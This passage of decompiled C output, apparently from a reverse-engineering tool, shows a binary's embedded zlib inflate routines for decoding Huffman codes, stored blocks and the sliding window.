  undefined *puVar6;
  undefined *puVar7;
  uint uVar8;
  int iVar9;
  undefined *local_20;
  byte *local_1c;
  undefined *local_18;
  byte *local_14;
  byte *local_10;
  uint local_8;
  
  local_10 = *in_EAX;
  local_14 = in_EAX[1];
  puVar2 = *(uint **)((int)this + 4);
  local_8 = *(uint *)((int)this + 0x20);
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar8 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  uVar5 = *puVar2;
  while (uVar5 < 10) {
    switch((&switchD_0038a2d0::switchdataD_0038a8b0)[uVar5]) {
    case (undefined *)0x38a2d7:
      if ((local_18 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_0038a374:
        puVar2[3] = (uint)*(byte *)(puVar2 + 4);
        puVar2[2] = puVar2[5];
        *puVar2 = 1;
        goto switchD_0038a2d0_caseD_38a38a;
      }
      *(uint *)((int)this + 0x20) = local_8;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      pbVar4 = *in_EAX;
      *in_EAX = local_10;
      in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_0038bb70((uint)*(byte *)(puVar2 + 4),(uint)*(byte *)((int)puVar2 + 0x11),
                             puVar2[5],puVar2[6],(int)this,in_EAX);
      local_10 = *in_EAX;
      local_14 = in_EAX[1];
      uVar8 = *(uint *)((int)this + 0x1c);
      local_8 = *(uint *)((int)this + 0x20);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_0038a374;
      *puVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_0038a78f;
    case (undefined *)0x38a38a:
switchD_0038a2d0_caseD_38a38a:
      for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0038a7cc;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      local_1c = (byte *)(puVar2[2] + (*(uint *)(&DAT_003cef98 + puVar2[3] * 4) & local_8) * 8);
      local_8 = local_8 >> (local_1c[1] & 0x1f);
      uVar8 = uVar8 - local_1c[1];
      bVar1 = *local_1c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        puVar2[2] = *(uint *)(local_1c + 4);
        *puVar2 = 6;
        goto LAB_0038a78f;
      }
      if ((bVar1 & 0x10) != 0) {
        puVar2[2] = uVar5 & 0xf;
        puVar2[1] = *(uint *)(local_1c + 4);
        *puVar2 = 2;
        goto LAB_0038a78f;
      }
      if ((bVar1 & 0x40) != 0) {
        if ((bVar1 & 0x20) != 0) {
          *puVar2 = 7;
          goto LAB_0038a78f;
        }
        *puVar2 = 9;
        in_EAX[6] = (byte *)"invalid literal/length code";
        goto LAB_0038a80b;
      }
      goto LAB_0038a43e;
    case (undefined *)0x38a474:
      uVar5 = puVar2[2];
      for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0038a7cc;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      puVar2[1] = puVar2[1] + (*(uint *)(&DAT_003cef98 + uVar5 * 4) & local_8);
      local_8 = local_8 >> ((byte)uVar5 & 0x1f);
      uVar8 = uVar8 - uVar5;
      puVar2[3] = (uint)*(byte *)((int)puVar2 + 0x11);
      puVar2[2] = puVar2[6];
      *puVar2 = 3;
      break;
    case (undefined *)0x38a4e6:
      break;
    case (undefined *)0x38a59a:
      uVar5 = puVar2[2];
      for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0038a7cc;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      puVar2[3] = puVar2[3] + (*(uint *)(&DAT_003cef98 + uVar5 * 4) & local_8);
      local_8 = local_8 >> ((byte)uVar5 & 0x1f);
      uVar8 = uVar8 - uVar5;
      *puVar2 = 5;
    case (undefined *)0x38a601:
      local_20 = puVar7 + -puVar2[3];
      if (local_20 < *(undefined **)((int)this + 0x28)) {
        do {
          local_20 = local_20 +
                     (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_20 < *(undefined **)((int)this + 0x28));
      }
      uVar5 = puVar2[1];
      while (uVar5 != 0) {
        puVar6 = puVar7;
        if (local_18 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_18 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_18 != puVar6) {
              if (puVar6 < local_18) {
                local_18 = local_18 + (-1 - (int)puVar6);
              }
              else {
                local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_18 != (undefined *)0x0) goto LAB_0038a6bc;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_0038a140(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar3 = *(undefined **)((int)this + 0x30);
            if (puVar3 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar3) {
                local_18 = puVar3 + (-1 - (int)puVar7);
              }
              else {
                local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_18 == (undefined *)0x0) goto LAB_0038a81e;
        }
LAB_0038a6bc:
        *puVar6 = *local_20;
        local_20 = local_20 + 1;
        local_18 = local_18 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_20 == *(undefined **)((int)this + 0x2c)) {
          local_20 = *(undefined **)((int)this + 0x28);
        }
        puVar2[1] = puVar2[1] - 1;
        uVar5 = puVar2[1];
      }
LAB_0038a789:
      *puVar2 = 0;
      goto LAB_0038a78f;
    case (undefined *)0x38a6f6:
      puVar6 = puVar7;
      if (local_18 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_18 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_18 != puVar6) {
            if (puVar6 < local_18) {
              local_18 = local_18 + (-1 - (int)puVar6);
            }
            else {
              local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_18 != (undefined *)0x0) goto LAB_0038a772;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_0038a140(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar3 = *(undefined **)((int)this + 0x30);
          if (puVar3 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar3) {
              local_18 = puVar3 + (-1 - (int)puVar7);
            }
            else {
              local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_18 == (undefined *)0x0) {
LAB_0038a81e:
          *(uint *)((int)this + 0x20) = local_8;
          *(uint *)((int)this + 0x1c) = uVar8;
          in_EAX[1] = local_14;
          puVar7 = puVar6;
          goto LAB_0038a7dc;
        }
      }
LAB_0038a772:
      *puVar6 = *(undefined *)(puVar2 + 2);
      puVar7 = puVar6 + 1;
      local_18 = local_18 + -1;
      param_1 = 0;
      goto LAB_0038a789;
    case (undefined *)0x38a82f:
      if (7 < uVar8) {
        local_14 = local_14 + 1;
        uVar8 = uVar8 - 8;
        local_10 = local_10 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      iVar9 = FUN_0038a140(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) != puVar7) {
        *(uint *)((int)this + 0x20) = local_8;
        *(uint *)((int)this + 0x1c) = uVar8;
        in_EAX[1] = local_14;
        pbVar4 = *in_EAX;
        *in_EAX = local_10;
        in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
        *(undefined **)((int)this + 0x34) = puVar7;
        FUN_0038a140(iVar9);
        return;
      }
      *puVar2 = 8;
    case (undefined *)0x38a890:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      iVar9 = 1;
      goto LAB_0038a7ae;
    case (undefined *)0x38a8a6:
      iVar9 = -3;
      goto LAB_0038a79f;
    }
    for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_0038a7cc;
      local_14 = local_14 + -1;
      bVar1 = *local_10;
      local_10 = local_10 + 1;
      local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
      param_1 = 0;
    }
    local_1c = (byte *)(puVar2[2] + (*(uint *)(&DAT_003cef98 + puVar2[3] * 4) & local_8) * 8);
    local_8 = local_8 >> (local_1c[1] & 0x1f);
    bVar1 = *local_1c;
    uVar5 = (uint)bVar1;
    uVar8 = uVar8 - local_1c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *puVar2 = 9;
        in_EAX[6] = (byte *)"invalid distance code";
LAB_0038a80b:
        *(uint *)((int)this + 0x20) = local_8;
        *(uint *)((int)this + 0x1c) = uVar8;
        in_EAX[1] = local_14;
        iVar9 = -3;
        goto LAB_0038a7ae;
      }
LAB_0038a43e:
      puVar2[3] = uVar5;
      puVar2[2] = (uint)(local_1c + *(int *)(local_1c + 4) * 8);
    }
    else {
      puVar2[2] = uVar5 & 0xf;
      puVar2[3] = *(uint *)(local_1c + 4);
      *puVar2 = 4;
    }
LAB_0038a78f:
    uVar5 = *puVar2;
  }
  iVar9 = -2;
LAB_0038a79f:
  *(uint *)((int)this + 0x20) = local_8;
  *(uint *)((int)this + 0x1c) = uVar8;
  in_EAX[1] = local_14;
LAB_0038a7ae:
  pbVar4 = *in_EAX;
  *in_EAX = local_10;
  in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
  *(undefined **)((int)this + 0x34) = puVar7;
  FUN_0038a140(iVar9);
  return;
LAB_0038a7cc:
  *(uint *)((int)this + 0x20) = local_8;
  *(uint *)((int)this + 0x1c) = uVar8;
  in_EAX[1] = (byte *)0x0;
LAB_0038a7dc:
  pbVar4 = *in_EAX;
  *in_EAX = local_10;
  in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
  *(undefined **)((int)this + 0x34) = puVar7;
  FUN_0038a140(param_1);
  return;
}



void FUN_0038a8e0(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_0038a950(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_0038a8e0();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_0038a9f0(void *this,byte *param_1)

{
  int *piVar1;
  byte bVar2;
  undefined4 *puVar3;
  byte **in_EAX;
  uint uVar4;
  uint uVar5;
  undefined4 uVar6;
  undefined4 *puVar7;
  byte bVar8;
  byte *pbVar9;
  int iVar10;
  byte *pbVar11;
  uint *local_30;
  uint *local_2c;
  uint local_28;
  byte *local_24;
  uint local_20;
  byte *local_1c;
  byte *local_18;
  undefined4 *local_14;
  byte *local_10;
  undefined4 *local_c;
  uint local_8;
  
  local_c = (undefined4 *)*in_EAX;
  local_10 = in_EAX[1];
  local_14 = *(undefined4 **)((int)this + 0x34);
  uVar5 = *(uint *)((int)this + 0x20);
  pbVar11 = *(byte **)((int)this + 0x1c);
  if (local_14 < *(undefined4 **)((int)this + 0x30)) {
    local_1c = (byte *)((int)*(undefined4 **)((int)this + 0x30) + (-1 - (int)local_14));
  }
  else {
    local_1c = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
  }
                    // WARNING: Load size is inaccurate
  uVar6 = *this;
  local_8 = uVar5;
  do {
    switch(uVar6) {
    case 0:
      for (; pbVar11 < (byte *)0x3; pbVar11 = pbVar11 + 8) {
        if (local_10 == (byte *)0x0) goto LAB_0038b10b;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar5 = uVar5 | (uint)*(byte *)local_c << ((byte)pbVar11 & 0x1f);
        local_c = (undefined4 *)((int)local_c + 1);
        local_8 = uVar5;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar4 = (uint)(pbVar11 + -3) & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar4;
        pbVar11 = pbVar11 + -3 + -uVar4;
        *(undefined4 *)this = 1;
        local_8 = uVar5;
        break;
      case 1:
        iVar10 = FUN_0038a240(9,5,&DAT_003cefe0,&DAT_003cffe0);
        *(int *)((int)this + 4) = iVar10;
        if (iVar10 == 0) {
          param_1 = (byte *)0xfffffffc;
          goto LAB_0038b0db;
        }
        uVar5 = local_8 >> 3;
        pbVar11 = pbVar11 + -3;
        *(undefined4 *)this = 6;
        local_8 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        pbVar11 = pbVar11 + -3;
        *(undefined4 *)this = 3;
        local_8 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid block type";
        *(uint *)((int)this + 0x20) = local_8 >> 3;
        *(byte **)((int)this + 0x1c) = pbVar11 + -3;
        in_EAX[1] = local_10;
        param_1 = (byte *)0xfffffffd;
        goto LAB_0038b0ea;
      }
      break;
    case 1:
      for (; pbVar11 < (byte *)0x20; pbVar11 = pbVar11 + 8) {
        if (local_10 == (byte *)0x0) goto LAB_0038b154;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar5 = uVar5 | (uint)*(byte *)local_c << ((byte)pbVar11 & 0x1f);
        local_c = (undefined4 *)((int)local_c + 1);
        local_8 = uVar5;
      }
      uVar4 = uVar5 & 0xffff;
      if (~uVar5 >> 0x10 != uVar4) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid stored block lengths";
        param_1 = (byte *)0xfffffffd;
        goto LAB_0038b0db;
      }
      pbVar11 = (byte *)0x0;
      *(uint *)((int)this + 4) = uVar4;
      local_8 = 0;
      uVar5 = 0;
      if (uVar4 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case 2:
      if (local_10 == (byte *)0x0) {
LAB_0038b154:
        *(uint *)((int)this + 0x20) = local_8;
        goto LAB_0038b111;
      }
      if (local_1c == (byte *)0x0) {
        if (local_14 == *(undefined4 **)((int)this + 0x2c)) {
          puVar7 = *(undefined4 **)((int)this + 0x30);
          puVar3 = *(undefined4 **)((int)this + 0x28);
          if (puVar3 != puVar7) {
            if (puVar3 < puVar7) {
              local_1c = (byte *)((int)puVar7 + (-1 - (int)puVar3));
            }
            else {
              local_1c = (byte *)((int)*(undefined4 **)((int)this + 0x2c) - (int)puVar3);
            }
            local_14 = puVar3;
            if (local_1c != (byte *)0x0) goto LAB_0038ac18;
          }
        }
        *(undefined4 **)((int)this + 0x34) = local_14;
        param_1 = (byte *)FUN_0038a140((int)param_1);
        puVar7 = *(undefined4 **)((int)this + 0x30);
        local_14 = *(undefined4 **)((int)this + 0x34);
        if (local_14 < puVar7) {
          local_1c = (byte *)((int)puVar7 + (-1 - (int)local_14));
        }
        else {
          local_1c = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
        }
        if (local_14 == *(undefined4 **)((int)this + 0x2c)) {
          puVar3 = *(undefined4 **)((int)this + 0x28);
          if (puVar3 != puVar7) {
            local_14 = puVar3;
            if (puVar3 < puVar7) {
              local_1c = (byte *)((int)puVar7 + (-1 - (int)puVar3));
            }
            else {
              local_1c = (byte *)((int)*(undefined4 **)((int)this + 0x2c) - (int)puVar3);
            }
          }
        }
        if (local_1c == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_8;
          *(byte **)((int)this + 0x1c) = pbVar11;
          iVar10 = (int)local_c - (int)*in_EAX;
          *in_EAX = (byte *)local_c;
          in_EAX[1] = local_10;
          goto LAB_0038b0f3;
        }
      }
LAB_0038ac18:
      param_1 = (byte *)0x0;
      local_18 = *(byte **)((int)this + 4);
      if (local_10 < *(byte **)((int)this + 4)) {
        local_18 = local_10;
      }
      if (local_1c < local_18) {
        local_18 = local_1c;
      }
      FUN_003aee70(local_14,local_c,(uint)local_18);
      local_c = (undefined4 *)((int)local_c + (int)local_18);
      local_10 = local_10 + -(int)local_18;
      local_14 = (undefined4 *)((int)local_14 + (int)local_18);
      local_1c = local_1c + -(int)local_18;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_18;
      uVar5 = local_8;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case 3:
      for (; pbVar11 < (byte *)0xe; pbVar11 = pbVar11 + 8) {
        if (local_10 == (byte *)0x0) goto LAB_0038b191;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar5 = uVar5 | (uint)*(byte *)local_c << ((byte)pbVar11 & 0x1f);
        local_c = (undefined4 *)((int)local_c + 1);
        local_8 = uVar5;
      }
      *(uint *)((int)this + 4) = uVar5 & 0x3fff;
      if ((0x1d < (uVar5 & 0x1f)) || (uVar4 = (uVar5 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar4)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"too many length or distance symbols";
        goto switchD_0038aa41_caseD_9;
      }
      iVar10 = (*(code *)in_EAX[8])(in_EAX[10],uVar4 + 0x102 + (uVar5 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar10;
      if (iVar10 != 0) {
        uVar5 = local_8 >> 0xe;
        pbVar11 = pbVar11 + -0xe;
        *(undefined4 *)((int)this + 8) = 0;
        *(undefined4 *)this = 4;
        local_8 = uVar5;
        goto switchD_0038aa41_caseD_4;
      }
      goto LAB_0038b1c6;
    case 4:
switchD_0038aa41_caseD_4:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; pbVar11 < (byte *)0x3; pbVar11 = pbVar11 + 8) {
            if (local_10 == (byte *)0x0) {
LAB_0038b191:
              *(uint *)((int)this + 0x20) = local_8;
              *(byte **)((int)this + 0x1c) = pbVar11;
              pbVar11 = *in_EAX;
              *in_EAX = (byte *)local_c;
              in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar11);
              in_EAX[1] = (byte *)0x0;
              *(undefined4 **)((int)this + 0x34) = local_14;
              FUN_0038a140((int)param_1);
              return;
            }
            local_10 = local_10 + -1;
            param_1 = (byte *)0x0;
            local_8 = uVar5 | (uint)*(byte *)local_c << ((byte)pbVar11 & 0x1f);
            local_c = (undefined4 *)((int)local_c + 1);
            uVar5 = local_8;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_003d00e0 + *(int *)((int)this + 8) * 4) * 4) = uVar5 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_8 = local_8 >> 3;
          pbVar11 = pbVar11 + -3;
          uVar5 = local_8;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar5 = *(uint *)((int)this + 8);
      while (uVar5 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_003d00e0 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar5 = *(uint *)((int)this + 8);
      }
      *(uint *)((int)this + 0x10) = 7;
      local_18 = (byte *)FUN_0038b970(*(uint **)((int)this + 0xc),(uint *)((int)this + 0x10),
                                      (uint **)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (local_18 == (byte *)0x0) {
        *(undefined4 *)((int)this + 8) = 0;
        *(undefined4 *)this = 5;
        uVar5 = local_8;
        goto switchD_0038aa41_caseD_5;
      }
      if (local_18 == (byte *)0xfffffffd) {
        (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
        *(undefined4 *)this = 9;
      }
      *(uint *)((int)this + 0x20) = local_8;
      *(byte **)((int)this + 0x1c) = pbVar11;
      in_EAX[1] = local_10;
      iVar10 = (int)local_c - (int)*in_EAX;
      *in_EAX = (byte *)local_c;
      param_1 = local_18;
      goto LAB_0038b0f3;
    case 5:
switchD_0038aa41_caseD_5:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          pbVar9 = *(byte **)((int)this + 0x10);
          if (pbVar11 < pbVar9) {
            do {
              if (local_10 == (byte *)0x0) goto LAB_0038b191;
              local_10 = local_10 + -1;
              bVar8 = (byte)pbVar11;
              pbVar9 = *(byte **)((int)this + 0x10);
              pbVar11 = pbVar11 + 8;
              param_1 = (byte *)0x0;
              uVar5 = uVar5 | (uint)*(byte *)local_c << (bVar8 & 0x1f);
              local_c = (undefined4 *)((int)local_c + 1);
              local_8 = uVar5;
            } while (pbVar11 < pbVar9);
          }
          iVar10 = *(int *)((int)this + 0x14) +
                   (*(uint *)(&DAT_003cef98 + (int)pbVar9 * 4) & uVar5) * 8;
          bVar8 = *(byte *)(iVar10 + 1);
          local_18 = (byte *)(uint)bVar8;
          local_28 = *(uint *)(iVar10 + 4);
          if (local_28 < 0x10) {
            local_8 = uVar5 >> (bVar8 & 0x1f);
            pbVar11 = pbVar11 + -(int)local_18;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_28;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_28 == 0x12) {
              local_20 = 7;
            }
            else {
              local_20 = local_28 - 0xe;
            }
            local_1c = (byte *)((uint)(local_28 == 0x12) * 8 + 3);
            local_24 = local_18 + local_20;
            for (; pbVar11 < local_24; pbVar11 = pbVar11 + 8) {
              if (local_10 == (byte *)0x0) goto LAB_0038b10b;
              local_10 = local_10 + -1;
              bVar2 = *(byte *)local_c;
              local_c = (undefined4 *)((int)local_c + 1);
              uVar5 = uVar5 | (uint)bVar2 << ((byte)pbVar11 & 0x1f);
              param_1 = (byte *)0x0;
              local_8 = uVar5;
            }
            uVar5 = uVar5 >> (bVar8 & 0x1f);
            local_1c = local_1c + (*(uint *)(&DAT_003cef98 + local_20 * 4) & uVar5);
            local_8 = uVar5 >> ((byte)local_20 & 0x1f);
            pbVar11 = pbVar11 + -(int)(local_18 + local_20);
            iVar10 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_1c + iVar10) {
LAB_0038b258:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)"invalid bit length repeat";
              *(uint *)((int)this + 0x20) = local_8;
              *(byte **)((int)this + 0x1c) = pbVar11;
              in_EAX[1] = local_10;
              in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
              *in_EAX = (byte *)local_c;
              *(undefined4 **)((int)this + 0x34) = local_14;
              FUN_0038a140(-3);
              return;
            }
            if (local_28 == 0x10) {
              if (iVar10 == 0) goto LAB_0038b258;
              uVar6 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar10 * 4);
            }
            else {
              uVar6 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar10 * 4) = uVar6;
              iVar10 = iVar10 + 1;
              local_1c = local_1c + -1;
            } while (local_1c != (byte *)0x0);
            *(int *)((int)this + 8) = iVar10;
          }
          uVar5 = local_8;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_20 = 9;
      local_1c = (byte *)0x6;
      local_18 = (byte *)FUN_0038ba00((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                                      (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,
                                      *(uint **)((int)this + 0xc),&local_20,(uint *)&local_1c,
                                      &local_2c,&local_30,*(int *)((int)this + 0x24));
      if (local_18 != (byte *)0x0) {
        if (local_18 == (byte *)0xfffffffd) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_8;
        *(byte **)((int)this + 0x1c) = pbVar11;
        in_EAX[1] = local_10;
        in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
        *in_EAX = (byte *)local_c;
        *(undefined4 **)((int)this + 0x34) = local_14;
        FUN_0038a140((int)local_18);
        return;
      }
      puVar7 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1c);
      if (puVar7 == (undefined4 *)0x0) {
LAB_0038b1c6:
        *(uint *)((int)this + 0x20) = local_8;
        *(byte **)((int)this + 0x1c) = pbVar11;
        in_EAX[1] = local_10;
        param_1 = (byte *)0xfffffffc;
        goto LAB_0038b0ea;
      }
      *(undefined *)(puVar7 + 4) = (undefined)local_20;
      *(undefined *)((int)puVar7 + 0x11) = local_1c._0_1_;
      *puVar7 = 0;
      puVar7[5] = local_2c;
      puVar7[6] = local_30;
      *(undefined4 **)((int)this + 4) = puVar7;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_0038aa41_caseD_6:
      *(uint *)((int)this + 0x20) = local_8;
      *(byte **)((int)this + 0x1c) = pbVar11;
      in_EAX[1] = local_10;
      in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
      *in_EAX = (byte *)local_c;
      *(undefined4 **)((int)this + 0x34) = local_14;
      iVar10 = FUN_0038a280(this,(int)param_1);
      if (iVar10 != 1) goto LAB_0038b338;
      param_1 = (byte *)0x0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      local_10 = in_EAX[1];
      uVar5 = *(uint *)((int)this + 0x20);
      local_c = (undefined4 *)*in_EAX;
      pbVar11 = *(byte **)((int)this + 0x1c);
      local_14 = *(undefined4 **)((int)this + 0x34);
      if (local_14 < *(undefined4 **)((int)this + 0x30)) {
